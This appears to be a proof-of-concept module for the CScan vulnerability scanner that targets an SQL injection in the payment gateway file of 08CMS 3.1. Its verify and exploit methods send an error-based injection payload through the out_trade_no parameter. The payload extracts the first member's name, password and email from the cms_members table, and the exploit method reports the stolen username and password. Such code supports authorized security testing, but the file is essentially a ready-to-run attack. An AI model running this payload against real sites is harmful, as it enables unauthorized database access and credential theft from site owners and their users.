# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.parse
import urllib.error
import urllib.request
import urllib.error
import urllib.parse
import re


class Vuln(ABVuln):
    vuln_id = '08CMS_0001'  # 平台漏洞编号，留空
    name = '08CMS 3.1 /include/paygate/alipay/pays.php SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2013-08-31'  # 漏洞公布时间
    desc = '''
        漏洞出现在 /include/paygate/alipay/pays.php 文件。
    '''  # 漏洞描述
    ref = 'http://www.anyun.org/m/view.php?aid=7987'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '08CMS'  # 漏洞应用名称
    product_version = '3.1'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '5cd34660-9bca-4385-a400-e44c3cdeaea4'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-06'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = ("/include/paygate/alipay/pays.php?out_trade_no=22'%20AND%20(SELECT%201%20"
                       "FROM(SELECT%20COUNT(*),CONCAT((SELECT%20concat(0x3a,mname,0x3a,password,"
                       "0x3a,email,0x3a)%20from%20cms_members%20limit%200,1),FLOOR(RAND(0)*2))X%20"
                       "FROM%20information_schema.tables%20GROUP%20BY%20X)a)%20AND'")

            verify_url = '{target}'.format(target=self.target)+payload
            content = str(urllib.request.urlopen(
                urllib.request.Request(verify_url)).read())
            pattern = re.compile(
                r".*?Duplicate\s*entry\s*[']:(?P<username>[^:]+):(?P<password>[^:]+)", re.I | re.S)  # 忽略大小写、单行模式
            match = pattern.match(content)

            if match != None:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞;\n具体请查看漏洞详情'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 漏洞利用'.format(
                target=self.target, vuln=self.vuln))

            payload = "/include/paygate/alipay/pays.php?out_trade_no=22'%20AND%20(SELECT%201%20FROM(SELECT%20COUNT(*),CONCAT((SELECT%20concat(0x3a,mname,0x3a,password,0x3a,email,0x3a)%20from%20cms_members%20limit%200,1),FLOOR(RAND(0)*2))X%20FROM%20information_schema.tables%20GROUP%20BY%20X)a)%20AND'"

            verify_url = '{target}'.format(target=self.target)+payload
            content = str(urllib.request.urlopen(
                urllib.request.Request(verify_url)).read())
            pattern = re.compile(
                r".*?Duplicate\s*entry\s*[']:(?P<username>[^:]+):(?P<password>[^:]+)", re.I | re.S)  # 忽略大小写、单行模式
            match = pattern.match(content)

            if match != None:
                username = match.group("username")
                password = match.group("password")
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，获取到的用户名为:{username} 用户密码为:{password};\n具体请查看漏洞详情'.format(
                    target=self.target, name=self.vuln.name, username=username, password=password))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))


if __name__ == '__main__':
    Poc().run()
